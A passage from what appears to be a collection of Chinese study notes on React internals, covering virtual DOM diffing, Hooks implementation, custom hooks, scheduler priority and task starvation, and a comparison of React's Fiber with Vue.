vnode = {\n  tag: \"div\",\n  props: { id: \"app\" },\n  children: [\n    { tag: \"h1\", props: {}, children: [\"Hello World\"] },\n    {\n      tag: \"p\",\n      props: {},\n      children: [\"This is a simple React Diff implementation.\"],\n    },\n  ],\n};\n\n// 比较两个虚拟 DOM 节点\nfunction diff(oldVNode, newVNode) {\n  // 新增节点\n  if (!oldVNode) {\n    return newVNode;\n  }\n  // 删除节点\n  if (!newVNode) {\n    return null;\n  }\n  // 如果节点类型不同，直接替换成新节点\n  if (oldVNode.tag !== newVNode.tag) {\n    return newVNode; // 替换节点\n  }\n  // 比较属性\n  const propDiff = diffProps(oldVNode.props, newVNode.props);\n  \n  // 递归比较子节点\n  const childrenDiff = diffChildren(oldVNode.children, newVNode.children);\n\n  // 返回新的虚拟 DOM 节点\n  return { ...newVNode, propDiff, childrenDiff };\n}\n\n// 比较属性,返回属性的变化\nfunction diffProps(oldProps, newProps) {\n  // 比较属性的变化\n  const changes = {};\n  for (const key in newProps) {\n    if (oldProps[key] !== newProps[key]) {\n      changes[key] = newProps[key];\n    }\n  }\n  return changes;\n}\n\n// 递归比较子节点，这里只比较了子节点的长度，没有比较子节点的内容\n// 实际上还需要递归调用 diff 函数\nfunction diffChildren(oldChildren, newChildren) {\n  const diffs = [];\n  const maxLength = Math.max(oldChildren.length, newChildren.length);\n  for (let i = 0; i < maxLength; i++) {\n    diffs.push(diff(oldChildren[i], newChildren[i]));\n  }\n  return diffs;\n}\n\n```\n\n## 6. 不同操作的优先级是不同的\n\n比如，`更新`组件发生频率较高，所以 Diff 算法优先会看当前节点是否属于`更新`，所以，\n- 第一遍遍历：\n\t- 优先级看处理 `更新` 的节点\n- 第二遍遍历：\n\t- 处理不属于 `更新` 的节点，比如`新增`、`删除`\n\n## 7. 总结\n\n- 完全对比 `O(n³)` 无法接受，故降级为同层对比的 `O(n)` 方案\n\t- 为什么降级可行？因为跨层级很少发生，可以忽略\n- 同层级也不简单，难点是如何高效位移，即最小步数完成位移\n\t- React 采用`仅右移`方案，在大部分从左往右移的业务场景中，得到了较好的性能\n- vue 为了尽量不移动，先左右夹击跳过不变的，再找到最长连续子串保持不动，移动其他元素","eONn0bJJ":"\n# React Hooks 的原理\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 数据结构 \n\n- Hooks 的状态存储在 `Fiber 节`点的 `memoizedState` 属性中\n- React 使用`链表`结构来存储 Hooks 状态：\n- 每个 Hook 节点包含：\n    - 当前状态：`state`\n    - 更新队列: `queue` ，存储多次更新行为\n    - 依赖项（对于 useEffect 等）\n    - next：指向下一个 Hook 的指针\n\n### 1.1. 示例\n\n![图片&文件](./files/20241101-6.png)\n\n- Hooks 状态存储在 Fiber 节点上\n- 通过 Fiber 实现时间切片和优先级调度\n- 支持并发模式下的状态管理\n\n## 2. Hooks 规则\n\n1. **只在顶层调用 Hooks**\n    - 不能在循环、条件或嵌套函数中调用\n    - 确保 Hooks 的调用顺序保持一致\n2. **只在 React 函数组件中调用 Hooks**\n    - 不能在普通 JavaScript 函数中调用\n    - 不能在类组件中调用\n\n## 3. useState 的源码分析\n\n### 3.1. 入口\n\n所有的 Hooks 在 React.js 中被引入，挂载在 React 对象中，如下：\n\n```javascript hl:12\n// React.js\nimport {\n  useCallback,\n  useContext,\n  useEffect,\n  useImperativeHandle,\n  useDebugValue,\n  useLayoutEffect,\n  useMemo,\n  useReducer,\n  useRef,\n  useState,\n} from './ReactHooks';\n```\n\n### 3.2. Hook 对象的结构\n\n```ts\n// ReactFiberHooks.js\nexport type Hook = {\n  memoizedState: any,\n\n  baseState: any,\n  baseUpdate: Update<any, any> | null,\n  queue: UpdateQueue<any, any> | null,\n\n  next: Hook | null,\n};\n```\n\n### 3.3. 一个示例\n\n![图片&文件](./files/20241101-7.png)\n\n## 4. 简化版的 useState 实现\n\n### 4.1. 先给出一个架子\n\n```javascript\nfunction useState(initialValue) {\n    let state = initialValue;\n    const setState = (newValue) => {\n        state = newValue;\n        // 这里可以触发组件重新渲染\n    };\n    return [state, setState];\n}\n\n```\n\nReact useState 的核心原理：\n1. 通过`闭包`保存状态\n2. 使用`游标`确保 hooks 的调用顺序\n3. 触发重新渲染来更新视图\n4. 维护状态的一致性\n\n```javascript hl:29,34,35,14\n// 保存状态的数组\nlet states = [];\n// 当前处理的 hook 索引\nlet cursor = 0;\n\n// 简单的 useState 实现\nfunction useState(initialState) {\n  // 获取当前 hook 的索引\n  const currentCursor = cursor;\n\n  // 初始化状态\n  states[currentCursor] = states[currentCursor] || initialState;\n\n  // 更新函数\n  const setState = (newState) => {\n    // 支持函数式更新\n    states[currentCursor] =\n      typeof newState === \"function\"\n        ? newState(states[currentCursor])\n        : newState;\n\n    // 触发重新渲染\n    render();\n  };\n\n  // 移动游标到下一个位置\n  cursor++;\n\n  return [states[currentCursor], setState];\n}\n\n// 示例组件\nfunction Component() {\n  const [count, setCount] = useState(0);\n  const [text, setText] = useState(\"hello\");\n\n  return {\n    render: () => {\n      console.log(\"State:\", { count, text });\n    },\n    click: () => setCount(count + 1),\n    type: (newText) => setText(newText),\n  };\n}\n\n// 模拟 React 的渲染过程\nfunction render() {\n  // 重置游标\n  cursor = 0;\n  // 渲染组件\n  const component = Component();\n  component.render();\n  return component;\n}\n\n// 测试代码\nconsole.log(\"Initial render:\");\nconst component = render();\n\nconsole.log(\"\\nAfter clicking:\");\ncomponent.click();\n\nconsole.log(\"\\nAfter typing:\");\ncomponent.type(\"world\");\n\n```\n\n在实际的 React 实现中，还包含了更多的特性和优化，比如：\n\n- Fiber 架构的集成\n- 批量更新的处理\n- 优先级调度\n- 内存优化\n- 开发环境的调试支持\n\n## 5. 极简 React Hooks 实现\n\n```javascript hl:9,15,31\n// 存储 hooks 状态\nlet hooks = [];\nlet currentHook = 0;\n\n// 模拟 React 的工作原理\nfunction createReactLike() {\n  // 重置 hooks 游标\n  const render = (Component) => {\n    currentHook = 0;\n    const app = Component();\n    app.render();\n    return app;\n  }\n\n  // useState 实现\n  const useState = (initialValue) => {\n    const hookId = currentHook;\n    hooks[hookId] = hooks[hookId] || initialValue;\n\n    const setState = (newValue) => {\n      hooks[hookId] = typeof newValue === 'function' \n        ? newValue(hooks[hookId]) \n        : newValue;\n      reRender(); // 触发重新渲染\n    };\n\n    currentHook++;\n    return [hooks[hookId], setState];\n  }\n\n  // useEffect 实现\n  const useEffect = (callback, deps) => {\n    const hookId = currentHook;\n    const oldDeps = hooks[hookId];\n    \n    // 检查依赖是否变化\n    const hasChanged = !oldDeps || \n      !deps || \n      deps.some((dep, i) => !Object.is(dep, oldDeps[i]));\n\n    if (hasChanged) {\n      // 执行清理函数\n      if (hooks[hookId]?.cleanup) {\n        hooks[hookId].cleanup();\n      }\n      \n      // 执行 effect 并保存清理函数\n      hooks[hookId] = {\n        deps,\n        cleanup: callback()\n      };\n    }\n\n    currentHook++;\n  }\n\n  return {\n    useState,\n    useEffect,\n    render\n  }\n}\n\n// 创建 React 实例\nconst React = createReactLike();\nlet reRender;\n\n// 示例组件\nfunction Counter() {\n  const [count, setCount] = React.useState(0);\n  const [text, setText] = React.useState('hello');\n\n  React.useEffect(() => {\n    console.log(`Count changed to: ${count}`);\n    // 返回清理函数\n    return () => console.log(`Cleaning up count: ${count}`);\n  }, [count]);\n\n  React.useEffect(() => {\n    console.log(`Text changed to: ${text}`);\n    // 返回清理函数\n    return () => console.log(`Cleaning up text: ${text}`);\n  }, [text]);\n\n  return {\n    render: () => {\n      console.log('Render:', { count, text });\n    },\n    increment: () => setCount(c => c + 1),\n    decrement: () => setCount(c => c - 1),\n    updateText: (newText) => setText(newText)\n  };\n}\n\n// 初始渲染\nconsole.log('=== Initial Render ===');\nconst component = React.render(Counter);\n// 保存重新渲染函数\nreRender = () => React.render(Counter);\n\n// 测试状态更新\nconsole.log('\\n=== After Increment ===');\ncomponent.increment();\n\nconsole.log('\\n=== After Text Update ===');\ncomponent.updateText('world');\n\nconsole.log('\\n=== After Decrement ===');\ncomponent.decrement();\n```\n\n","Ey8OboDb":"\n# 手写自定义 Hooks\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- [ ] check 常见编程题\n\n## 2. useRequest：模拟请求\n\n```javascript\nimport { useState, useEffect } from \"react\";\n\nconst useRequest = () => {\n  const [data, setData] = useState(null);\n  const [loading, setLoading] = useState(false);\n  const [error, setError] = useState(null);\n  useEffect(() => {\n    const fetchData = async () => {\n      setLoading(true);\n      setError(null);\n\n      try {\n        const res = await fetch(url);\n        if (!res.ok) {\n          throw new Error(\"Network response\");\n        }\n        const result = await res.json();\n        setData(result);\n      } catch (error) {\n        setError(error.message);\n      } finally {\n        setLoading(false);\n      }\n    };\n\n    fetchData();\n  }, [url]);\n\n  return { data, loading, error };\n};\n\n// 使用\nconst MyComponent = () => {\n  const { data, loading, error } = useRequest(\"https://localhost:3000/api\");\n\n  if (loading) {\n    return <div>Loading...</div>;\n  }\n\n  if (error) {\n    return <div>Error: {error}</div>;\n  }\n\n  return (\n    <div>\n      <h1>Data fetched:</h1>\n      <pre>{JSON.stringify(data, null, 2)}</pre>\n    </div>\n  );\n};\n\n```\n\n> 比较成熟的请求 hooks：[swr](https://swr.vercel.app/)\n\n## 3. useSetState：管理 object 类型的 state 的 Hooks\n\n```javascript\nimport { useState } from \"react\";\n\nconst useSetState = (initialState) => {\n  const [state, setState] = useState(initialState);\n\n  const setMergeState = (key, value) => {\n    setState((prev) => ({ ...prev, [key]: value }));\n  };\n\n  return [state, setMergeState];\n};\n\n```\n\n## 4. useDidMount：类似于类组件中的 `componentDidMount`，用于组件挂载后的操作\n\n```javascript hl:12,6\nimport { useEffect } from \"react\";\n\nconst useDidMount = (callback) => {\n  useEffect(() => {\n    callback();\n    // 空数组：表示只在组件挂载时执行一次\n  }, []);\n};\n\n// 使用\nconst MyComponent = () => {\n  useDidMount(() => {\n    console.log(\"Component has mounted!\");\n  });\n\n  return (\n    <div>\n      <h1>Hello, World!</h1>\n    </div>\n  );\n};\n\n```\n\n## 5. useUnmount：类似于类组件中的 `componentWillUnmount`，用于组件卸载时的操作\n\n```javascript hl:19\nimport { useEffect } from \"react\";\n\n// 定义：组件卸载时执行回调\n// 参数：callback 回调函数，组件卸载时执行\n// 原理：useEffect 第一个参数是一个函数，返回一个函数，当组件卸载时执行返回的函数\nconst useUnmount = (callback) => {\n  useEffect(() => {\n    // 没其他逻辑，如果有，会在组件刚挂载时执行\n    // 但是这里我们只关心组件卸载时执行\n    // 清理函数\n    return () => {\n      callback();\n    };\n  }, []);\n};\n\n// 使用\nconst MyComponent = () => {\n  useUnmount(() => {\n    console.log(\"Component has unmount!\");\n  });\n\n  return (\n    <div>\n      <h1>Hello, World!</h1>\n    </div>\n  );\n};\n\n```\n\n## 6. useDebounce：用于处理输入框内容的防抖处理，避免频繁触发请求\n\n```javascript hl:16\nimport { useState, useEffect } from \"react\";\n\nconst useDebounce = (stateValue, wait) => {\n  const [val, setVal] = useState(stateValue);\n\n  useEffect(() => {\n    const timer = setTimeout(() => {\n      setVal(stateValue);\n    }, wait);\n\n    // 清除定时器\n    return () => {\n      clearTimeout(timer);\n    };\n    // 这里依赖 stateValue，当 stateValue 变化时，重新设置定时器\n    // 所以不需要像 lodash.debounce 那样，每次都重新创建一个新的函数\n  }, [stateValue, wait]);\n\n  return val;\n};\n\nconst MyComponent = () => {\n  const [value, setValue] = useState < string > \"\";\n  const debouncedValue = useDebounce(value, 500);\n\n  return (\n    <div>\n      <input\n        value={value}\n        onChange={(e) => setValue(e.target.value)}\n        placeholder=\"Typed value\"\n        style={{ width: 280 }}\n      />\n      <p style={{ marginTop: 16 }}>DebouncedValue: {debouncedValue}</p>\n    </div>\n  );\n};\n\n```\n\n## 7. useThrottle：用于限制某个函数的调用频率\n\n```javascript \nimport { useState, useEffect } from \"react\";\n\n// 方案一：防抖值\nfunction useDebounce(value, delay = 500) {\n  const [debouncedValue, setDebouncedValue] = useState(value);\n\n  useEffect(() => {\n    const timer = setTimeout(() => {\n      setDebouncedValue(value);\n    }, delay);\n\n    return () => clearTimeout(timer);\n  }, [value, delay]);\n\n  return debouncedValue;\n}\n\n// 方案二：防抖函数\nfunction useDebounceFn(fn, delay = 500) {\n  const [timer, setTimer] = useState(null);\n\n  const debouncedFn = (...args) => {\n    // 如果有定时器，清除定时器\n    if (timer) clearTimeout(timer);\n\n    // 设置定时器\n    setTimer(\n      setTimeout(() => {\n        fn(...args);\n      }, delay),\n    );\n  };\n\n  return debouncedFn;\n}\n\n// 使用示例\nfunction SearchComponent() {\n  const [searchTerm, setSearchTerm] = useState(\"\");\n  // 使用防抖值\n  const debouncedSearchTerm = useDebounce(searchTerm, 500);\n\n  // 使用防抖函数\n  const handleSearch = useDebounceFn((value) => {\n    console.log(\"Searching for:\", value);\n  }, 500);\n\n  return (\n    <div>\n      {/* 方案一：使用防抖值 */}\n      <input\n        value={searchTerm}\n        onChange={(e) => setSearchTerm(e.target.value)}\n        placeholder=\"使用防抖值...\"\n      />\n      <p>防抖后的值: {debouncedSearchTerm}</p>\n\n      {/* 方案二：使用防抖函数 */}\n      <input\n        onChange={(e) => handleSearch(e.target.value)}\n        placeholder=\"使用防抖函数...\"\n      />\n    </div>\n  );\n}\n\n```\n\n## 8. useLocalStorage：便捷地使用 `localStorage` 存储数据\n\n```javascript\nimport { useState } from 'react';\n\nconst useLocalStorage = (key, initialValue) => {\n    const [storedValue, setStoredValue] = useState(() => {\n        try {\n            const item = window.localStorage.getItem(key)\n            return item ? JSON.parse(item) : initialValue\n        } catch (error) {\n            console.log(error)\n            return initialValue\n        }\n    })\n    \n    const SetValue = (value) => {\n        try {\n            const valueToStore = \n                  value instanceof Function ? value(storedValue) : value;\n            setStoredValue(valueToStore);\n      \t\twindow.localStorage.setItem(key, JSON.stringify(valueToStore));\n        } catch (error) {\n            console.log(error)\n        }\n    }\n    \n    return [storedValue, setValue]\n}\n```\n\n> 需要JSON 解析或者序列化\n\n## 9. useEventListener：用于简化事件监听器的添加和清理\n\n```javascript hl:4,22\nimport { useEffect , useRef } from 'react';\n\nconst useEventListener = (eventName, handler, element = window) => {\n    const savedHandle = useRef()\n    \n    useEffect(() => {\n        savedHandle.current = handle\n    }, [handle])\n    \n    useEffect(() => {\n        const isSupported = element && element.addEventListener\n        if (!isSupported) return;\n        \n        const eventListener = event => savedHandle.current(event)\n        \n       \telement.addEventListener(eventName, eventListener);\n        \n     \t// 清理函数，卸载时移除事件监听器\n        return () => {\n          element.removeEventListener(eventName, eventListener);\n        };\n    }, [eventName, element])\n}\n\nconst MyComponent = () => {\n  const handleScroll = () => {\n    console.log('Scrolled!', window.scrollY);\n  };\n\n  useEventListener('scroll', handleScroll); // 添加滚动事件监听\n\n  return (\n    <div style={{ height: '2000px', background: 'linear-gradient(#fff, `#000)'` }}>\n      <h1>Scroll down to see event listener in action!</h1>\n    </div>\n  );\n};\n```\n\n## 10. useScroll：用于监测滚动位置的变化\n\n```javascript\nimport { useEffect, useState } from 'react';\n\n/**\n * 自定义 Hook，用于获取当前的滚动位置\n */\nconst useScroll = () => {\n  const [scrollPosition, setScrollPosition] = useState({ \n    scrollX: window.scrollX, \n    scrollY: window.scrollY \n  });\n\n  const handleScroll = () => {\n    setScrollPosition({ \n      scrollX: window.scrollX, \n      scrollY: window.scrollY \n    });\n  };\n\n  useEffect(() => {\n    window.addEventListener('scroll', handleScroll);\n\n    // 组件卸载时移除事件监听器\n    return () => {\n      window.removeEventListener('scroll', handleScroll);\n    };\n  }, []);\n\n  return scrollPosition;\n};\n\n// 使用\nconst MyComponent = () => {\n  const { scrollX, scrollY } = useScroll(); // 使用自定义的滚动 Hook\n\n  return (\n    <div style={{ height: '2000px', background: 'linear-gradient(#fff, `#000)'` }}>\n      <h1>Scroll to see scroll position!</h1>\n      <p>Scroll X: {scrollX}</p>\n      <p>Scroll Y: {scrollY}</p>\n    </div>\n  );\n};\n```\n\n## 11. 更多：阿里 ahooks\n\nhttps://ahooks.js.org/zh-CN/hooks/use-request/index","CEGgEdvd":"\n# React 的优先级调度机制和打断处理\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n总结一下 React 防止低优先级任务饥饿的主要机制：\n1. 过期时间：每个任务都有过期时间，==一旦过期会被强制执行==\n2. 优先级提升：\n\t- 长时间得不到执行的低优任务会被提升优先级\n3. 时间片轮转：\n\t- 通过==时间片划分==，确保任务能够交替执行\n4. ==动态优先级==：\n\t- 任务优先级不是固定的，会根据等待时间动态调整\n5. 批量更新：\n\t- 相同优先级的更新会被合并，提高执行效率\n\n>  这种机制确保了即使在==高优先级任务频繁插入的情况下==，低优先级任务最终也能得到执行，同时又不会影响用户交互的流畅性。\n\n## 2. 优先级打断机制\n\n```javascript\n// 简化的优先级定义\nconst priorities = {\n  ImmediatePriority: 1,     // 最高优先级，同步任务\n  UserBlockingPriority: 2,  // 用户交互\n  NormalPriority: 3,        // 普通优先级\n  LowPriority: 4,          // 低优先级\n  IdlePriority: 5          // 空闲优先级\n}\n```\n\n打断过程如下：\n\n```javascript\nfunction workLoop(deadline) {\n  // 是否有待处理的高优先级任务\n  while (currentTask !== null && !shouldYield()) {\n    try {\n      // 如果有更高优先级任务进来\n      if (hasHigherPriorityWork()) {\n        // 中断当前工作\n        return suspendCurrentWork();\n      }\n      performUnitOfWork(currentTask);\n    } catch (err) {\n      // 错误处理\n    }\n  }\n}\n```\n\n## 3. 饥饿问题解决方案\n\nReact 通过以下机制来防止低优先级任务饥饿：\n\n### 3.1. 过期时间机制\n\n```javascript\nfunction scheduleCallback(priorityLevel, callback) {\n  const currentTime = getCurrentTime();\n  \n  // 根据优先级计算过期时间\n  const timeout = getTimeoutByPriorityLevel(priorityLevel);\n  const expirationTime = currentTime + timeout;\n  \n  const newTask = {\n    callback,\n    priorityLevel,\n    expirationTime,\n    startTime: currentTime,\n  };\n  \n  // 将任务加入队列\n  push(taskQueue, newTask);\n}\n\n// 不同优先级的超时时间\nconst timeoutForPriorityLevel = {\n  [ImmediatePriority]: -1,  // 立即执行\n  [UserBlockingPriority]: 250,\n  [NormalPriority]: 5000,\n  [LowPriority]: 10000,\n  [IdlePriority]: maxSigned31BitInt\n};\n```\n\n### 3.2. 任务饥饿检测\n\n```javascript\nfunction shouldYieldToHost() {\n  const currentTime = getCurrentTime();\n  \n  // 检查是否有过期任务\n  if (peek(taskQueue) !== null) {\n    const expiredTask = peek(taskQueue);\n    if (expiredTask.expirationTime <= currentTime) {\n      // 如果任务过期，强制执行\n      return true;\n    }\n  }\n  \n  return false;\n}\n```\n\n## 4. 优先级提升机制\n\n```javascript\nfunction markTaskExpired(task) {\n  const currentTime = getCurrentTime();\n  \n  if (currentTime >= task.expirationTime) {\n    // 过期任务提升优先级\n    task.priorityLevel = ImmediatePriority;\n  }\n}\n```\n\n## 5. 时间片轮转\n\n```javascript\nfunction workLoopConcurrent() {\n  // 当有工作要做且时间片未用完\n  while (workInProgress !== null && !shouldYield()) {\n    workInProgress = performUnitOfWork(workInProgress);\n  }\n}\n\nfunction shouldYield() {\n  // 检查时间片是否用完\n  const currentTime = getCurrentTime();\n  return currentTime >= deadline;\n}\n```\n\n## 6. 任务队列管理\n\n```javascript\nclass Scheduler {\n  constructor() {\n    this.taskQueue = new MinHeap();      // 普通任务队列\n    this.timerQueue = new MinHeap();     // 延时任务队列\n  }\n  \n  scheduleTask(task) {\n    const currentTime = getCurrentTime();\n    \n    if (task.startTime <= currentTime) {\n      // 立即执行的任务\n      this.taskQueue.push(task);\n    } else {\n      // 延时任务\n      this.timerQueue.push(task);\n    }\n  }\n  \n  // 获取下一个要执行的任务\n  getNextTask() {\n    const currentTime = getCurrentTime();\n    \n    // 将到期的延时任务移到普通队列\n    this.advanceTimers(currentTime);\n    \n    // 返回最高优先级的任务\n    return this.taskQueue.peek();\n  }\n}\n```\n\n## 7. 可中断渲染的实现\n\n```javascript\nfunction renderRoot(root, isYieldy) {\n  // 是否可以中断\n  isWorkLoopConcurrent = isYieldy;\n  \n  do {\n    try {\n      workLoopConcurrent();\n    } catch (thrownValue) {\n      handleError(root, thrownValue);\n    }\n  } while (workInProgress !== null && !shouldYield());\n  \n  // 如果还有未完成的工作\n  if (workInProgress !== null) {\n    // 返回未完成标记\n    return RootIncomplete;\n  }\n  \n  // 所有工作完成\n  return RootCompleted;\n}\n```\n\n## 8. 优先级继承\n\n```javascript\nfunction scheduleUpdateOnFiber(fiber, lane) {\n  const root = markUpdateLaneFromFiberToRoot(fiber);\n  \n  if (lane === SyncLane) {\n    // 同步优先级\n    ensureRootIsScheduled(root);\n  } else {\n    // 异步优先级\n    scheduleCallback(\n      schedulerPriorityLevel,\n      () => {\n        performConcurrentWorkOnRoot(root);\n      }\n    );\n  }\n}\n```\n\n## 9. 批量更新处理\n\n```javascript\nfunction batchedUpdates(fn) {\n  const prevExecutionContext = executionContext;\n  executionContext |= BatchedContext;\n  try {\n    return fn();\n  } finally {\n    executionContext = prevExecutionContext;\n    // 如果没有其他工作正在进行，刷新同步队列\n    if (executionContext === NoContext) {\n      flushSyncCallbackQueue();\n    }\n  }\n}\n```\n\n","ESefv4El":"\n# 任务饥饿（Task Starvation）\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 首先检查是否有过期任务，有则最优先执行\n- 如果没有过期任务，则按优先级处理\n\n## 2. 任务饥饿的概念\n\n想象一个餐厅场景：\n```javascript hl:7\nclass Restaurant {\n  constructor() {\n    this.vipOrders = [];    // 高优先级订单\n    this.normalOrders = []; // 普通优先级订单\n  }\n\n  // 模拟传统的处理方式\n  processOrders() {\n    while(true) {\n      // 总是优先处理 VIP 订单\n      if(this.vipOrders.length > 0) {\n        this.processVipOrder();\n      } else if(this.normalOrders.length > 0) {\n        this.processNormalOrder();\n      }\n    }\n  }\n}\n```\n\n如果 VIP 订单不断进来，普通订单就会一直得不到处理，这就是\"饥饿\"现象。\n\n## 3. React 中的任务饥饿\n\n```javascript hl:13,6\n// 简化的 React 任务示例\nconst tasks = {\n  // 高优先级任务：用户点击按钮\n  highPriority: {\n    type: 'UserBlockingPriority',\n    expirationTime: 250, // 250ms 超时\n    work: () => updateButtonState()\n  },\n  \n  // 低优先级任务：数据列表渲染\n  lowPriority: {\n    type: 'NormalPriority',\n    expirationTime: 5000, // 5000ms 超时\n    work: () => renderDataList()\n  }\n}\n```\n\n## 4. 饥饿问题的具体表现\n\n```javascript\n// 问题场景模拟\nfunction problematicScheduler() {\n  let highPriorityTasks = [];\n  let lowPriorityTasks = [];\n  \n  setInterval(() => {\n    // 模拟频繁的高优先级任务\n    highPriorityTasks.push(() => console.log('High priority task'));\n  }, 100);\n  \n  // 低优先级任务可能永远无法执行\n  while(true) {\n    if(highPriorityTasks.length > 0) {\n      const task = highPriorityTasks.shift();\n      task();\n    } else if(lowPriorityTasks.length > 0) {\n      const task = lowPriorityTasks.shift();\n      task();\n    }\n  }\n}\n```\n\n## 5. React 解决方案演示\n\n```javascript hl:22,30,35\nclass ImprovedScheduler {\n  constructor() {\n    this.tasks = new Map();\n    this.currentTime = 0;\n  }\n  \n  addTask(task) {\n    const expirationTime = this.currentTime + task.timeout;\n    this.tasks.set(task.id, {\n      ...task,\n      expirationTime,\n      startTime: this.currentTime\n    });\n  }\n  \n  // 改进的调度器\n  schedule() {\n    while(this.tasks.size > 0) {\n      const now = this.currentTime;\n      let nextTask = null;\n      \n      // 1. 首先检查是否有过期任务\n      for(const [id, task] of this.tasks) {\n        if(now >= task.expirationTime) {\n          nextTask = task;\n          break;\n        }\n      }\n      \n      // 2. 如果没有过期任务，则按优先级处理\n      if(!nextTask) {\n        nextTask = this.getHighestPriorityTask();\n      }\n      \n      // 3. 执行任务\n      this.executeTask(nextTask);\n    }\n  }\n  \n  // 示例：执行任务\n  executeTask(task) {\n    console.log(`Executing task: ${task.id}`);\n    // 实际执行任务\n    task.work();\n    this.tasks.delete(task.id);\n  }\n}\n\n// 使用示例\nconst scheduler = new ImprovedScheduler();\n\n// 添加一些任务\nscheduler.addTask({\n  id: 'button-click',\n  priority: 'high',\n  timeout: 250,\n  work: () => console.log('Button click handled')\n});\n\nscheduler.addTask({\n  id: 'data-fetch',\n  priority: 'low',\n  timeout: 5000,\n  work: () => console.log('Data fetched and rendered')\n});\n```\n\n## 6. 实际效果对比\n\n没有解决饥饿问题的情况：\n\n```javascript hl:6\n// 糟糕的情况\nTime 0ms: 高优任务1开始执行\nTime 100ms: 高优任务2进入\nTime 200ms: 高优任务3进入\nTime 300ms: 高优任务4进入\n// 低优任务一直得不到执行\n```\n\nReact 的解决方案：\n\n```javascript hl:4\n// 改进后的情况\nTime 0ms: 高优任务1开始执行\nTime 100ms: 高优任务2执行\nTime 250ms: 低优任务1得到执行（因为到达超时时间）\nTime 300ms: 高优任务3执行\nTime 500ms: 低优任务2得到执行\n```\n\n## 7. 生动的类比：排队\n\n- 这就像排队买票：\n\t- 普通窗口：按先来后到\n\t- VIP窗口：优先处理\n- React的解决方案相当于：\n\t- 给普通用户发放\"等待时间过长\"加急券\n\t- 超过等待时限的普通用户可以去VIP窗口\n\t- 确保每个人最终都能得到服务\n\n通过这种机制，React 确保：\n\n1. 高优先级任务能够快速响应（比如用户交互）\n2. 低优先级任务不会无限期等待（比如数据更新、渲染）\n3. 系统整体运行更加公平和高效\n\n这就是为什么在 React 应用中，即使有大量的更新任务，用户交互依然流畅，而且后台更新最终也都能完成的原因。","xxFysrPO":"\n# 为什么 React 需要 Fiber 架构，而 Vue 似乎不需要类似的机制\n\n`#react` `#vue` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- ==UI = f(state)==\n\t- 每次状态 `state` 变化时都会重新渲染整个组件树\n\t\t- 在旧的架构中，这种计算可能会阻塞主线程，导致页面卡顿。\n\t\t- 但碰到长任务时，往往会阻塞，所以引入 Fiber 架构\n- Fiber 架构\n\t- 使 React 能够更好地控制渲染过程，包括可中断更新、调度\n- Vue 通过**其响应式系统和编译时优化** 做到精细化更新\n\t- 依赖追踪系统更精确\n\t- 默认情况下性能已经很好\n\t- ==编译时优化==减少了运行时的工作量\n\n## 2. React 的特点和挑战\n\nReact 的核心理念是：\n\n```javascript\nUI = f(state)\n```\n\n这意味着 React 在**每次状态变化时都会重新渲染整个组件树**。\n\n这种方法简单直接，但也带来了一些挑战：\n\n```jsx hl:9\n// React 组件示例\nfunction App() {\n  const [count, setCount] = useState(0);\n  \n  return (\n    <div>\n      <h1>Count: {count}</h1>\n      <button onClick={() => setCount(count + 1)}>Increment</button>\n      <LargeList items={generateItems(1000)} />\n    </div>\n  );\n}\n```\n\n在这个例子中，即使只是更新了 `count`，React 也会重新渲染整个组件树，包括 `LargeList`。\n\n## 3. Fiber 架构的必要性\n\nFiber 架构主要解决了以下问题：\n\n### 3.1. 大型应用的性能问题\n\n```javascript\n// 模拟大量计算\nfunction heavyComputation() {\n  let result = 0;\n  for (let i = 0; i < 1000000000; i++) {\n    result += Math.random();\n  }\n  return result;\n}\n\nfunction SlowComponent() {\n  const result = heavyComputation();\n  return <div>{result}</div>;\n}\n```\n\n在旧的架构中，这种计算可能会阻塞主线程，导致页面卡顿。\n\n### 3.2. 优先级调度\n\n```jsx\n<div>\n  <UserInfo />  // 高优先级\n  <Newsfeed />  // 低优先级\n  <Sidebar />   // 低优先级\n</div>\n```\n\nFiber 允许 React 根据优先级调度更新。\n\n### 3.3. 可中断的渲染过程\n\n```javascript\n// Fiber 允许将渲染工作分解成小单元\nlet nextUnitOfWork = null;\n\nfunction workLoop(deadline) {\n  while (nextUnitOfWork && deadline.timeRemaining() > 0) {\n    nextUnitOfWork = performUnitOfWork(nextUnitOfWork);\n  }\n  requestIdleCallback(workLoop);\n}\n\nrequestIdleCallback(workLoop);\n```\n\n## 4. Vue 的不同之处\n\nVue 采用了不同的策略：\n\n### 4.1. 细粒度的依赖追踪\n\n```vue\n<template>\n  <div>\n    <h1>{{ count }}</h1>\n    <button @click=\"increment\">Increment</button>\n    <large-list :items=\"items\" />\n  </div>\n</template>\n\n<script>\nexport default {\n  data() {\n    return {\n      count: 0,\n      items: []\n    }\n  },\n  methods: {\n    increment() {\n      this.count++\n    }\n  }\n}\n</script>\n```\n\nVue 能够**精确地知道**哪些组件依赖于 `count`，只更新必要的部分。\n\n### 4.2. 异步更新队列\n\n```javascript\n// Vue 内部的更新队列机制\nlet queue = [];\nlet waiting = false;\n\nfunction queueJob(job) {\n  if (!queue.includes(job)) {\n    queue.push(job);\n    if (!waiting) {\n      waiting = true;\n      Promise.resolve().then(flushJobs);\n    }\n  }\n}\n\nfunction flushJobs() {\n  for (let i = 0; i < queue.length; i++) {\n    queue[i]();\n  }\n  queue = [];\n  waiting = false;\n}\n```\n\nVue 通过这种机制来批量处理更新，减少不必要的渲染。\n\n### 4.3. 编译时优化\n\n```vue\n<template>\n  <div>\n    <p>Static content</p>\n    <p>{{ dynamicContent }}</p>\n  </div>\n</template>\n```\n\nVue 的模板编译器可以在编译时识别静态内容，从而减少运行时的工作。\n\n## 5. 总结比较\n\nReact（使用 Fiber）:\n- 适合大型、复杂的应用\n- 提供更细粒度的控制和调度\n- 能够处理长时间运行的任务而不阻塞 UI\nVue:\n- 依赖追踪系统更精确\n- 默认情况下性能已经很好\n- 编译时优化减少了运行时的工作量\n\n## 6. 结论\n\nReact 需要 Fiber 架构主要是因为它的**设计理念**（**整体重新渲染**）带来的挑战。\n- Fiber 使 React 能够更好地控制渲染过程，提高大型应用的性能。\nVue 通过**其响应式系统和编译时优化**，在大多数情况下已经能够提供良好的性能，因此不需要像 Fiber 这样复杂的架构。\n然而，这并不意味着 Vue 完全不需要类似的优化。事实上，Vue 3 